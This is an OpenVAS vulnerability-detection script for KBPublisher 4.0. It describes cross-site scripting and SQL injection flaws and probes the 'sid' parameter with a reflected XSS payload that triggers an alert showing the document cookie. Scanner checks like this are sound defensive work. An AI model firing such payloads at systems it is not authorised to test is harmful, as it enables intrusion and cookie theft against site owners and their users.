##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kb_publisher_mult_vuln.nasl 13783 2019-02-20 11:12:24Z cfischer $
#
# KBPublisher Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802434");
  script_version("$Revision: 13783 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-20 12:12:24 +0100 (Wed, 20 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-06-11 14:44:53 +0530 (Mon, 11 Jun 2012)");
  script_name("KBPublisher Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://1337day.com/exploits/18467");
  script_xref(name:"URL", value:"http://mondoristoranti.com/kbpublisher-v4-0-multiple-vulnerabilities/");
  script_xref(name:"URL", value:"http://www.allinfosec.com/2012/06/07/webapps-0day-kbpublisher-v4-0-multiple-vulnerabilities/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal cookie
  based authentication credentials, compromise the application, access or modify
  data or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"KBPublisher version 4.0");

  script_tag(name:"insight", value:"- Input passed via the 'Type' parameter to 'browser.html' is not
  properly sanitised before being returned to the user.

  - Input passed via the 'id' parameter to 'admin/index.php' is not properly
  sanitised before being used in SQL queries.

  - Input passed via the 'sid' parameter to 'index.php' is not properly
  sanitised before being used .");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running KBPublisher and is prone to multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/", "/kb", "/kbp",  cgi_dirs(port:port))) {

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( ! res ) continue;

  if( res =~ "HTTP/1.. 200" && ">KBPublisher<" >< res && "Knowledge base software" >< res ) {

    url = dir + '/?&sid="><script>alert(document.cookie)</script>';

    if(http_vuln_check( port: port, url: url, check_header: TRUE,
       pattern:"><script>alert\(document\.cookie\)</script>" ,
       extra_check: ">KBPublisher<"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);